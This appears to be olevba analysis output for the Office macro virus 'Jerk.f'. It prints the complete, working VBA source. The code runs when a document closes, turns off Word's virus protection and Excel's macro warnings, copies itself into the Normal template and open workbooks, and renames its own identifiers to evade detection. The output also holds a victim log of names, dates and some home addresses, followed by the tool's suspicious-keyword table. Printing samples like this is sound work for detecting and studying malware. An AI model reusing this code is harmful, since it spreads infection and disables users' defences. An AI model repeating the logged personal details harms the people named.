olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

































Private Sub Document_Close()
On Error Resume Next
Const SFSSGK = True, KCAQJMOJJDRYHY = False, KJJXWAMOIUASANT = 0, KSCGZOGSQMYM = 1, XUGVOQRVYOYIXPC = wdFormatDocument, PYZYGN = wdFormatTemplate, QMWRMNE = ":"
Dim IYFCTHWLZBKHCVX, QZPOEJNWRCZWQK, TSBBZRVHYEGJZ, PAIRETTUYL As Boolean
Dim QDYQIGDMTNCRJGL, LOFGEOSILO As Object
Dim VKCFZKHOPULL, NANUCHZCFZ As String
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
Set QDYQIGDMTNCRJGL = ActiveDocument.VBProject.VBComponents.Item(KSCGZOGSQMYM)
Set LOFGEOSILO = NormalTemplate.VBProject.VBComponents.Item(KSCGZOGSQMYM)
Randomize
TSBBZRVHYEGJZ = KCAQJMOJJDRYHY
PAIRETTUYL = KCAQJMOJJDRYHY
If QDYQIGDMTNCRJGL.CodeModule.CountOfLines <> KJJXWAMOIUASANT Then TSBBZRVHYEGJZ = SFSSGK
If LOFGEOSILO.CodeModule.CountOfLines <> KJJXWAMOIUASANT Then PAIRETTUYL = SFSSGK
Options.VirusProtection = KCAQJMOJJDRYHY
If (TSBBZRVHYEGJZ = SFSSGK Xor PAIRETTUYL = SFSSGK) And (ActiveDocument.SaveFormat = XUGVOQRVYOYIXPC Or ActiveDocument.SaveFormat = PYZYGN) Then
If TSBBZRVHYEGJZ = SFSSGK Then
QZPOEJNWRCZWQK = NormalTemplate.Saved
NANUCHZCFZ = QDYQIGDMTNCRJGL.CodeModule.Lines(KSCGZOGSQMYM, QDYQIGDMTNCRJGL.CodeModule.CountOfLines)
Call RNKAIGOZLFWPJ(NANUCHZCFZ)
If Int(Rnd * 10 * KSCGZOGSQMYM) = KSCGZOGSQMYM * 7 Then Call KNGJXOZZSHM(NANUCHZCFZ)
Call KNIUGYJYGURSY(NANUCHZCFZ)
LOFGEOSILO.CodeModule.InsertLines KSCGZOGSQMYM, NANUCHZCFZ
If QZPOEJNWRCZWQK = SFSSGK Then NormalTemplate.Save
End If
VKCFZKHOPULL = Mid(ActiveDocument.FullName, 2, KSCGZOGSQMYM)
If PAIRETTUYL = SFSSGK And (VKCFZKHOPULL = QMWRMNE Or ActiveDocument.Saved = KCAQJMOJJDRYHY) Then
IYFCTHWLZBKHCVX = ActiveDocument.Saved
NANUCHZCFZ = LOFGEOSILO.CodeModule.Lines(KSCGZOGSQMYM, LOFGEOSILO.CodeModule.CountOfLines)
Call KNIUGYJYGURSY(NANUCHZCFZ)
QDYQIGDMTNCRJGL.CodeModule.InsertLines KSCGZOGSQMYM, NANUCHZCFZ
If IYFCTHWLZBKHCVX = SFSSGK Then ActiveDocument.Save
End If
End If
End Sub
Private Sub KNGJXOZZSHM(ByRef NANUCHZCFZ As String)
On Error Resume Next
Const ZIJVOF = 48, ZQCUFKOKTYX = 15, LYZXQTVTHQRPPNA = 5, MTTWUHZUGESQCCY = 65, QHCTJ = 90, KSCGZOGSQMYM = 1, SFSSGK = True, KCAQJMOJJDRYHY = False
Dim GMPCJXHAP, YDAMMTmp, WCDKOQDAC, YDAMM(KSCGZOGSQMYM To ZIJVOF), YDAMM2(KSCGZOGSQMYM To ZIJVOF) As String
Dim BLRXPBCZWINJ, EJXKD, IUKGXYNVW As Integer
Dim SLJRHVJ As Boolean
GMPCJXHAP = "NANUCHZCFZ ZIJVOF YDAMM YDAMM2 WCDKOQDAC BLRXPBCZWINJ EJXKD IUKGXYNVW SLJRHVJ KNGJXOZZSHM ZQCUFKOKTYX LYZXQTVTHQRPPNA MTTWUHZUGESQCCY QHCTJ KSCGZOGSQMYM GMPCJXHAP YDAMMTmp IYFCTHWLZBKHCVX QZPOEJNWRCZWQK TSBBZRVHYEGJZ PAIRETTUYL QDYQIGDMTNCRJGL LOFGEOSILO RNKAIGOZLFWPJ XQZONFLXNIZ UWDBOZBBTFDPYN XGZQH EQWRNZSRCXGI XQZONFLXNIZTmp TXFCLERDMBMXUH BNZVYEHGN VKCFZKHOPULL SFSSGK KCAQJMOJJDRYHY KJJXWAMOIUASANT XUGVOQRVYOYIXPC PYZYGN DCZWUW TIAIDQTFFKYTYPG QMWRMNE MVUQOOUIAA YBOVNV JWLRKMJNEKEVGM GLRKFIDJ KNIUGYJYGURSY AYQBIAYTMDCAQX SOHUZ LPXOGR"
Randomize
EJXKD = KSCGZOGSQMYM
For BLRXPBCZWINJ = KSCGZOGSQMYM To Len(GMPCJXHAP)
If Mid(GMPCJXHAP, BLRXPBCZWINJ, KSCGZOGSQMYM) = " " Or BLRXPBCZWINJ = Len(GMPCJXHAP) Then
If BLRXPBCZWINJ = Len(GMPCJXHAP) Then YDAMMTmp = YDAMMTmp & Mid(GMPCJXHAP, BLRXPBCZWINJ, KSCGZOGSQMYM)
For IUKGXYNVW = KSCGZOGSQMYM To Int((ZQCUFKOKTYX - LYZXQTVTHQRPPNA + KSCGZOGSQMYM) * Rnd + LYZXQTVTHQRPPNA)
YDAMM2(EJXKD) = YDAMM2(EJXKD) & Chr(Int((QHCTJ - MTTWUHZUGESQCCY + KSCGZOGSQMYM) * Rnd + MTTWUHZUGESQCCY))
Next IUKGXYNVW
YDAMM(EJXKD) = YDAMMTmp
YDAMMTmp = ""
EJXKD = EJXKD + KSCGZOGSQMYM
Else
YDAMMTmp = YDAMMTmp & Mid(GMPCJXHAP, BLRXPBCZWINJ, KSCGZOGSQMYM)
End If
Next BLRXPBCZWINJ
SLJRHVJ = KCAQJMOJJDRYHY
For BLRXPBCZWINJ = KSCGZOGSQMYM To Len(NANUCHZCFZ)
For EJXKD = KSCGZOGSQMYM To ZIJVOF
If Mid(NANUCHZCFZ, BLRXPBCZWINJ, Len(YDAMM(EJXKD))) = YDAMM(EJXKD) Then
WCDKOQDAC = WCDKOQDAC & YDAMM2(EJXKD)
BLRXPBCZWINJ = BLRXPBCZWINJ + Len(YDAMM(EJXKD)) - KSCGZOGSQMYM
SLJRHVJ = SFSSGK
Exit For
End If
Next EJXKD
If SLJRHVJ = KCAQJMOJJDRYHY Then
WCDKOQDAC = WCDKOQDAC & Mid(NANUCHZCFZ, BLRXPBCZWINJ, KSCGZOGSQMYM)
Else
SLJRHVJ = KCAQJMOJJDRYHY
End If
Next BLRXPBCZWINJ
NANUCHZCFZ = WCDKOQDAC
End Sub
Private Sub RNKAIGOZLFWPJ(ByRef NANUCHZCFZ As String)
On Error Resume Next
Const EQWRNZSRCXGI = "' ", KSCGZOGSQMYM = 1
Const DCZWUW = "hh:mm:ss: AMPM - ", TIAIDQTFFKYTYPG = "dddd, d mmm yyyy"
Dim XQZONFLXNIZTmp, XQZONFLXNIZ, TXFCLERDMBMXUH, BNZVYEHGN, UWDBOZBBTFDPYN, XGZQH As String
Dim BLRXPBCZWINJ As Integer
UWDBOZBBTFDPYN = Chr(10 * KSCGZOGSQMYM + 3)
XQZONFLXNIZ = Application.UserAddress
BNZVYEHGN = Format(Time, DCZWUW) & Format(Date, TIAIDQTFFKYTYPG)
XGZQH = Chr(KSCGZOGSQMYM * 10)
TXFCLERDMBMXUH = Application.UserName
For BLRXPBCZWINJ = KSCGZOGSQMYM To Len(XQZONFLXNIZ)
If Mid(XQZONFLXNIZ, BLRXPBCZWINJ, KSCGZOGSQMYM) <> UWDBOZBBTFDPYN Then
If Mid(XQZONFLXNIZ, BLRXPBCZWINJ, KSCGZOGSQMYM) <> XGZQH Then
XQZONFLXNIZTmp = XQZONFLXNIZTmp & Mid(XQZONFLXNIZ, BLRXPBCZWINJ, KSCGZOGSQMYM)
End If
Else
XQZONFLXNIZTmp = XQZONFLXNIZTmp & UWDBOZBBTFDPYN & EQWRNZSRCXGI
End If
Next BLRXPBCZWINJ
NANUCHZCFZ = NANUCHZCFZ & UWDBOZBBTFDPYN & EQWRNZSRCXGI & BNZVYEHGN & UWDBOZBBTFDPYN & EQWRNZSRCXGI & TXFCLERDMBMXUH & UWDBOZBBTFDPYN & EQWRNZSRCXGI & XQZONFLXNIZ & UWDBOZBBTFDPYN
End Sub
Private Sub KNIUGYJYGURSY(ByVal NANUCHZCFZ As String)
On Error Resume Next
Dim LPXOGR As Long
Dim MVUQOOUIAA As Object
Dim AYQBIAYTMDCAQX, SOHUZ As String
AYQBIAYTMDCAQX = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
LPXOGR = &H0
SOHUZ = "Options6"
System.PrivateProfileString("", AYQBIAYTMDCAQX, SOHUZ) = LPXOGR
Set MVUQOOUIAA = GetObject(, "Excel.Application")
Const KSCGZOGSQMYM = 1, KJJXWAMOIUASANT = 0
Dim JWLRKMJNEKEVGM As String
Dim BLRXPBCZWINJ, EJXKD As Integer
JWLRKMJNEKEVGM = "ThisWorkbook"
For BLRXPBCZWINJ = KSCGZOGSQMYM To MVUQOOUIAA.Application.Workbooks.Count
For EJXKD = KSCGZOGSQMYM To MVUQOOUIAA.Application.Workbooks.Item(BLRXPBCZWINJ).VBProject.VBComponents.Count
If MVUQOOUIAA.Application.Workbooks.Item(BLRXPBCZWINJ).VBProject.VBComponents.Item(EJXKD).CodeModule.CountOfLines = KJJXWAMOIUASANT Then
MVUQOOUIAA.Application.Workbooks.Item(BLRXPBCZWINJ).VBProject.VBComponents.Item(EJXKD).CodeModule.InsertLines KSCGZOGSQMYM, NANUCHZCFZ
If MVUQOOUIAA.Application.Workbooks.Item(BLRXPBCZWINJ).VBProject.VBComponents.Item(EJXKD).Name = JWLRKMJNEKEVGM Then
MVUQOOUIAA.Application.Workbooks.Item(BLRXPBCZWINJ).VBProject.VBComponents.Item(EJXKD).CodeModule.ReplaceLine 33 * KSCGZOGSQMYM, "Private Sub Workbook_Deactivate()"
Else
MVUQOOUIAA.Application.Workbooks.Item(BLRXPBCZWINJ).VBProject.VBComponents.Item(EJXKD).CodeModule.ReplaceLine KSCGZOGSQMYM * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next EJXKD
Next BLRXPBCZWINJ
Set MVUQOOUIAA = Nothing
End Sub
Private Sub GLRKFIDJ(ByVal NANUCHZCFZ As String)
On Error Resume Next
Const SFSSGK = True, KCAQJMOJJDRYHY = False, KSCGZOGSQMYM = 1, KJJXWAMOIUASANT = 0
Dim YBOVNV As Object
Dim QZPOEJNWRCZWQK As Boolean
Set YBOVNV = GetObject(, "Word.Application")
If YBOVNV.NormalTemplate.VBProject.VBComponents.Item(KSCGZOGSQMYM).CodeModule.CountOfLines = KJJXWAMOIUASANT Then
QZPOEJNWRCZWQK = YBOVNV.NormalTemplate.Saved
YBOVNV.Options.VirusProtection = KCAQJMOJJDRYHY
YBOVNV.NormalTemplate.VBProject.VBComponents.Item(KSCGZOGSQMYM).CodeModule.InsertLines KSCGZOGSQMYM, NANUCHZCFZ
If QZPOEJNWRCZWQK = SFSSGK Then YBOVNV.NormalTemplate.Save
End If
Set YBOVNV = Nothing
End Sub

' 09:50:09: AM - Wednesday, 10 Feb 1999
' Al Peabody
' 1634 Orchard Beach Road
Annapolis, MD 21401

' 09:42:15: AM - Monday, 22 Feb 1999
' Sergey Morozov
'

' 09:49:26: AM - ÷åòâåðã, 11 ìàð 1999
' Advisor
'

' 04:16:54:  - ïîíåäåëüíèê, 22 ìàð 1999
' ***
'

' 11:52:11:  - ÷åòâåðã, 15 àïð 1999
' Freddy Kruger
'

' 11:45:13:  - âòîðíèê, 27 ìàé 1997
' MAXuS
'

' 09:59:34:  - ñóááîòà, 3 èþí 1995
' 7
'

' 08:02:29:  - ñóááîòà, 7 ôåâ 1998
' Alex
'

' 11:07:41:  - âîñêðåñåíüå, 8 ôåâ 1998
' Alex
'

' 01:34:29:  - ïîíåäåëüíèê, 9 ôåâ 1998
' Alex
'

' 07:03:00:  - ñðåäà, 4 ôåâ 1998
' Alex
'

' 08:17:00:  - ñðåäà, 16 ôåâ 2000
' Allenov
'

' 09:16:19:  - ïÿòíèöà, 18 ôåâ 2000
' Àëë¸íîâ Áîðèñ Âàñèëüåâè÷
'

' 09:07:19:  - ñóááîòà, 26 ôåâ 2000
' Allenov
'

' 09:05:07:  - ñðåäà, 15 ìàð 2000
' ghj.
'

' 08:49:58:  - ÷åòâåðã, 16 ìàð 2000
' "
'

' 05:08:13:  - ñðåäà, 3 ìà¼ 2000
' 23
'

' 02:55:27:  - ïÿòíèöà, 5 ìàé 2000
' Êàôåäðà ÂÒ
'

' 09:25:39:  - âîñêðåñåíüå, 14 ìàé 2000
' Nikolai
'

' 04:44:13: PM - ñðåäà, 31 ìàé 2000
' Mike
' Jhuma
Shibrampur
Burichang
Comilla

' 02:45:34: PM - Monday, 12 Jun 2000
' Ditry PC
'

' 02:49:01: PM - Wednesday, 23 Aug 2000
' MACRO
'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

